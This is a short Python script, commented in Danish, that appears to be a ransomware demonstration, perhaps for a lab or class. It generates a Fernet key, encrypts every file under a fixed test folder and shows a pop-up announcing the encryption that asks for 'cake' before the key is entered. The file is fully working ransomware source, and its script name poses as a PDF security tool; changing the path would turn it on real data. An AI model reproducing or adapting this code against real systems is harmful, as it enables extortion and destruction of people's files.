import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import simpledialog, messagebox

# Filnavne som konstanter
Nøgle_Filen = 'ikke_vigtig.key'
Script_navn = 'SikkerPDF.py'

# Fast sti til mappen, der skal behandles
Sti = r'C:\ransomware-test'

# Generer en nøgle og gem den i en fil
def generere_nøgle():
    nøgle = Fernet.generate_key()
    with open(Nøgle_Filen, 'wb') as nøgle_fil:
        nøgle_fil.write(nøgle)
    return nøgle

# Indlæs nøglen fra filen
def læs_nøgle():
    return open(Nøgle_Filen, 'rb').read()

# Krypter filer i en mappe
def krypter_filer(folder_sti, nøgle):
    f = Fernet(nøgle)
    for root, dirs, filer in os.walk(folder_sti):
        for fil in filer:
            fil_sti = os.path.join(root, fil)
            if fil == Nøgle_Filen or fil == Script_navn:
                continue
            with open(fil_sti, 'rb') as file_data:
                data = file_data.read()
            krypteret_data = f.encrypt(data)
            with open(fil_sti, 'wb') as file_data:
                file_data.write(krypteret_data)
    print("Filerne er blevet krypteret.")

# Vis pop-up og spørg straks om dekrypteringsnøglen
def dekrypt_pop_up(folder_sti, nøgle):
    root = tk.Tk()
    root.withdraw()  # Skjul hovedvinduet
    # Spørg om dekrypteringsnøglen
    dekrypt_nøgle = simpledialog.askstring(
        "Filer krypteret",
        "Dine filer er blevet krypteret.\n\nGiv kage for at få din dekrypterings nøgle.\n\nIndtast dekrypteringsnøglen:"
    )
    if dekrypt_nøgle:
        try:
            if dekrypt_nøgle.encode() == nøgle:
                dekrypter(folder_sti, nøgle)
                messagebox.showinfo("Succes", "Filerne er blevet dekrypteret.")
            else:
                messagebox.showerror("Fejl", "Forkert nøgle. Filerne forbliver krypterede.")
        except Exception as e:
            messagebox.showerror("Fejl", f"En fejl opstod: {e}")
    else:
        messagebox.showwarning("Advarsel", "Dekryptering blev annulleret.")

# Dekrypter filer i en mappe
def dekrypter(folder_sti, nøgle):
    f = Fernet(nøgle)
    for root, dirs, filer in os.walk(folder_sti):
        for fil in filer:
            fil_sti = os.path.join(root, fil)
            if fil == Nøgle_Filen or fil == Script_navn:
                continue
            with open(fil_sti, 'rb') as file_data:
                krypteret_data = file_data.read()
            decrypted_data = f.decrypt(krypteret_data)
            with open(fil_sti, 'wb') as file_data:
                file_data.write(decrypted_data)
    print("Filerne er blevet dekrypteret.")

if __name__ == '__main__':
    # Tjek om stien findes
    if not os.path.exists(Sti):
        print(f"Den angivne sti ({Sti}) findes ikke. Lukker programmet.")
    else:
        # Krypter filer automatisk og generer en ny nøgle
        nøgle = generere_nøgle()
        krypter_filer(Sti, nøgle)

        # Spørg straks om dekrypteringsnøglen med integreret besked
        dekrypt_pop_up(Sti, nøgle)
